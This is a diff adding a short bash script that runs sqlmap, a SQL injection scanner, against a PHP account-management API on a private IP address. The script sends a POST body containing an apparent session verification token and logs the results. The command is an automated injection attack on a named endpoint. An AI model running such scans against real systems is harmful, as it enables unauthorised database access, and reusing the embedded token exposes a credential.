@@ -1,0 +1,2 @@
+#!/bin/bash
+python /Users/zhaichuang/Downloads/sqlmapproject-sqlmap-1c737d7/sqlmap.py -u "http://172.16.56.199/api/whistleMS/index.php" --data "m=manager&a=getAccountManagerList&device_type=web&school=ligong&verify=admin_ligong_MS_ligong__web__5a5f3071693ba__05c0877691d5922afd2ac76d1ebc435f__86269202-142f-4740-99b2-21324ea1c133&user_type=1&account_type=3" --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/11.log
